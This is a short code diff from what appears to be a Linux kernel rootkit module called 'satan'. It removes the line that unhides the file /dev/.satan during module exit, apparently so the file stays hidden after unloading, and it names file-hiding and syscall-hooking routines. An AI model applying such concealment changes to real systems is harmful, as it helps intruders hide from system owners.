@@ -26,7 +26,6 @@ static void __exit satan_exit(void)
 {
         pr_info("satan: shutting down...\n");
 
-        satan_file_unhide("/dev/.satan");
 
         satan_file_exit();
         satan_syscall_exit();
